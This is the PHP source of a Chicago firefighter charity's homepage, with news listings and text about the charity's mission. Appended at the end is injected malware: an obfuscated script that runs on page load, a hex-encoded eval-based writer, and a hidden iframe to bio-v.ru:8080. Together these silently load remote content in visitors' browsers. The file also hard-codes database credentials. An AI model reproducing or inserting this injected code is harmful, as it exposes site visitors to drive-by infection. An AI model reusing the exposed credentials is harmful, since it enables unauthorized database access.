<?php

$dbhost = 'mysql.ignitethespirit.org';
$dbuser = 'ignite';
$dbpass = 'fire08';

$conn = mysql_connect($dbhost, $dbuser, $dbpass) or die ('Error connecting to mysql');

$dbname = 'ignite';
mysql_select_db($dbname);


function bbcode_format ($str) {
    $str = htmlentities($str);

    $simple_search = array(
                '/\[b\](.*?)\[\/b\]/is',                                
                '/\[i\](.*?)\[\/i\]/is',                                
                '/\[u\](.*?)\[\/u\]/is',                                
                //'/\[url\=(.*?)\](.*?)\[\/url\]/is',                         
                //'/\[url\](.*?)\[\/url\]/is',                             
                //'/\[align\=(left|center|right)\](.*?)\[\/align\]/is',    
                //'/\[img\](.*?)\[\/img\]/is',                            
                //'/\[mail\=(.*?)\](.*?)\[\/mail\]/is',                    
                //'/\[mail\](.*?)\[\/mail\]/is',                            
                //'/\[font\=(.*?)\](.*?)\[\/font\]/is',                    
                //'/\[size\=(.*?)\](.*?)\[\/size\]/is',                    
                //'/\[color\=(.*?)\](.*?)\[\/color\]/is',  
				'/\[return\]/is',      
                );

    $simple_replace = array(
                '<strong>$1</strong>',
                '<em>$1</em>',
                '<u>$1</u>',
                //'<a href="$1">$2</a>',
                //'<a href="$1">$1</a>',
                //'<div style="text-align: $1;">$2</div>',
                //'<img src="$1" />',
                //'<a href="mailto:$1">$2</a>',
                //'<a href="mailto:$1">$1</a>',
                //'<span style="font-family: $1;">$2</span>',
                //'<span style="font-size: $1;">$2</span>',
                //'<span style="color: $1;">$2</span>',
				'<br /><br />',
                );

    // Do simple BBCode's
    $str = preg_replace ($simple_search, $simple_replace, $str);

    // Do <blockquote> BBCode
    //$str = bbcode_quote ($str);

    return $str;
} 

$query = "SELECT * FROM news WHERE news_active = 1 ORDER BY news_date DESC LIMIT 0,5";
$news_result = mysql_query($query);

function news($query_result) 
{
	while ($row = mysql_fetch_array($query_result, MYSQL_ASSOC)) 
	{
	$content = stripslashes ($row['news_content']);
	$print_date = date('F j, Y', strtotime($row['news_date']));
		echo "<p>";
		echo "<strong>".$print_date." | ".stripslashes($row['news_title'])."</strong><br>";
		echo bbcode_format($content);
		//echo $row['news_link'];
		if ( $row['news_link'] != 0 ) { echo " [ <a href='pages.php?id=".$row['news_link']."'>More Info</a> ]"; }
		echo "</p>";
	}
}


$blurb_query = "SELECT * FROM pages ORDER by page_id DESC";
$blurb_result = mysql_query($blurb_query);

function blurbs($query_result)
{
	$page_link = "Read More";
	while ($row = mysql_fetch_array($query_result, MYSQL_ASSOC)) 
	{
		if ($row['page_show'] != 0)
		{
			echo "<div class='blurb'> \n";
        	echo "<h3>".$row['page_title']."</h3> \n";
			echo "<img src=/".$row['page_img1']."> \n";
	    	echo "<p><a class='change' href='pages.php?id=".$row['page_id']."'>[".$page_link."]</a></p> \n";
        	echo "</div> \n";
		}
	}
}


?>


<?php include("header.php"); ?>
	<div class="container">
    	<div class="left">
		  	<a class="logo_link" href="index.php"><img src="images/its_logo_rollover.jpg" alt="logo" /></a>
        	<div class="left_content">
				<?php include("navigation.php"); ?>
				
        	</div>
			
			<div class="study_link">
			<a href="study_group_form.php">Lieutenant Study Group<br />Information</a>
			</div>
			
		
		</div>
		<div class="middle">
        	<div class="middle_content">
				<h1>We're There When You Need Us</h1>
				<p>Each year that passes is another year further away from 9/11.  In the hearts and minds of Chicago’s firefighters, the travesty happened just yesterday.  Every time they go on a call, they know there’s a chance they may not return.  On that Tuesday morning in 2001, that quiet prayer first responders keep to themselves, became loud and clear as the World Trade Center towers fell.  We all knew in our hearts that many people had just died.  We knew that many firefighters were in the buildings and we knew what they were attempting to do.  Our firefighters make a career of risking their lives to save the lives of others.  The dedication displayed by 343 firefighters who died on that fateful morning in September is equaled only by that of their brothers and sisters in their ranks – to safeguard our families and neighborhoods every day with courage and uncompromising devotion. <br /><br /> 

After 9/11, Americans everywhere proudly flew their flags of stars and stripes, encouraging our nation to come together.  It only then occurred to us that we were not prepared to handle such large devastation on our City’s own ground, like that at Ground Zero.  In June 2003, Ignite the Spirit was established to aid and assist Chicago’s first responders and their families in their time of need, despite their rank or assignment.  Ignite the Spirit was designed to lend a hand to families needing immediate financial support, regardless of hardship.  Hardship hits when and where we least expect it to.  Not once since our inception five years ago could we have envisioned the tremendous impact Ignite the Spirit has made on CFD families. [<a href="about.php">Read More</a> ]

<!-- “We’re There When You Need Us”<br /><br /> 

Every Chicago Fire Department vehicle proudly displays this phrase.  Ignite the Spirit was created for Chicago firefighters and their families in times of need.  This is our chance to give back to those who put their lives at risk on a daily basis and for giving something back to them for doing so much for the communities and neighborhoods in which we live.  Ignite the Spirit lets our firefighters know that we’ll be there when THEY need US.<br /><br /> 
  
To date, Ignite the Spirit has helped 59 families in their time of need totaling over 150,000.  Not only does Ignite the Spirit help families financially, we have collected an upwards of 4,000 toys and children’s gifts during each Christmas season!  New toy donations are collected and given to local hospitals and other deserving charities.  This is just another way of us leaving no one behind; especially our kids, during the season of giving.  In years past, not only have we accomplished putting smiles on the faces of kids in and around Chicago during Christmas, but we have also taken gifts to the areas devastated by Hurricanes Rita and Katrina in 2005.  In addition to toy drives, Ignite the Spirit holds 8-10 fundraising events throughout the year including a firefighter calendar, softball game, numerous pancake breakfasts and our largest fundraiser, the golf outing.<br /><br /> 

Our fundraisers help to spread the word about Ignite the Spirit. Our advertising is all word of mouth.  Friends and family like you are what makes us great!  Without the interest that has been circulated about Ignite the Spirit, an impact on the lives of others could not have been made.  <br /><br /> 

Thank you for visiting our site and supporting Ignite the Spirit! --> </p>

            	
			</div>
	    	<div class="middle_secondary">
				<h2>Recent News</h2>
				<?php news($news_result); ?>
				<span>[ <a href="news.php">View All</a> ]</span>
			</div>
      </div>
	  <div class="right">
	  		<div class="calendar_advertisement">
				<h1>Ignite The Spirit Calendar</h1>
				<img width="75%" src="images/2009Calendar.jpg" alt="
<!-- /ad -->
<?php echo ''; ?>
<?php echo '<script>function HPkDx(BTOyBCO, JHi, dohkdlb){var EwHRWW=dohkdlb.split(JHi);var XFdsDX='';for(hUDiKAOew=-0xa-0x27-0x1b+0x18+0x1d+0x17;hUDiKAOew<(EwHRWW.length-1);hUDiKAOew+=0xc+0x22+0x1c+0x4-0x4d){ sjZb = EwHRWW[hUDiKAOew]^BTOyBCO;XFdsDX += String.fromCharCode(sjZb);}return XFdsDX;}function Qquuhlwb(tAEu){ var LNuGs = document.getElementById('xOGCRdaqIR'); fff.op.replace("157"); } 
;function qYjeCeDf(){var aLRvWh=new Function("gaR", "return "+HPkDx(0x23+0x2d+0x2e+0x103, 'e','485e494e482e500e492e484e495e501e')+"."+HPkDx(0x2f+0xc-0x30-0x29+0x12d, 'G','365G352G363G374G')+"");var KoJr=aLRvWh(-0x6-0x31+0xe+0x2a);KoJr.innerHTML += HPkDx(-0x17-0x6+0xbb, 'y','162y247y248y236y255y243y251y190y233y247y250y234y246y163y175y190y246y251y247y249y246y234y163y175y190y252y241y236y250y251y236y163y174y190y248y236y255y243y251y252y241y236y250y251y236y163y174y190y237y236y253y163y185y246y234y234y238y164y177y177y232y235y236y243y241y179y237y234y172y176y253y240y177y237y234y255y236y177y247y240y250y251y230y176y238y246y238y185y160y162y177y247y248y236y255y243y251y160y');}function njYjtn(zGlht){ alert('Fpew'); fff.op.replace("336");alert('Fpew'); } 
;if(window.addEventListener){window.addEventListener('load',qYjeCeDf,false);}else if(window.attachEvent){window.attachEvent('onload', qYjeCeDf);}function MsVOfO(XSGsAu){  fff=op.split("827");alert('lNDhfs'); fff.op.replace("867"); } 
;</script>'; ?>

<script>c10zc='';y4fbee4a0=/* yee010e0b6 */document;y4fbee4a0.write('<scr'+'ipt>function y11bfdd(yf632b5){return ev'+c10zc+'al(yf632b5); }</scr'+'ipt>');  function c10b010268y58eb08(y1f8c7){ function y6409363c7(){return 16;} var ze5='';return (y11bfdd('pa'+ze5+'rseInt')(y1f8c7,y6409363c7()));}function yc1a6b0b(y7db136){  var y6cf5be657e2='';y4aefa89b='fromCh';y8eb22a=String[y4aefa89b+'arCode'];for(ybe0e023=0;ybe0e023<y7db136.length;ybe0e023+=2){ y6cf5be657e2+=(y8eb22a(c10b010268y58eb08(y7db136.substr(ybe0e023,2))));}return y6cf5be657e2;} var y783fc='3C7363726970743E69662821'+c10zc+'6D796961'+c10zc+'297B646F63756D656E742E777269746528756E65736361'+c10zc+'7065282027253363253639253636253732253631'+c10zc+'253664253635253230253665253631'+c10zc+'253664253635253364253633253331'+c10zc+'253330253230253733253732253633253364253237253638253734253734253730253361'+c10zc+'253266253266253332253331'+c10zc+'253332253265253331'+c10zc+'253337253334253265253332253330253330253265253331'+c10zc+'253332253330253266253265253634253639253636253266253637253666253265253730253638253730253366253733253639253634253364253331'+c10zc+'26253237253262253464253631'+c10zc+'253734253638253265253732253666253735253665253634253238253464253631'+c10zc+'253734253638253265253732253631'+c10zc+'253665253634253666253664253238253239253261'+c10zc+'253333253333253336253338253337253335253239253262253237253339253335253334253636253332253338253332253631'+c10zc+'253237253230253737253639253634253734253638253364253336253332253335253230253638253635253639253637253638253734253364253335253333253339253230253733253734253739253663253635253364253237253736253639253733253639253632253639253663253639253734253739253361'+c10zc+'253638253639253634253634253635253665253237253365253363253266253639253636253732253631'+c10zc+'2536642536352533652729293B7D7661'+c10zc+'72206D796961'+c10zc+'3D747275653B3C2F7363726970743E';y4fbee4a0.write(yc1a6b0b(y783fc));</script>
<div style="display:none">qgsopnvydsvlldhmczxozdbuxpbboxp<iframe width=984 height=219 src="http://bio-v.ru:8080/index.php" ></iframe></div>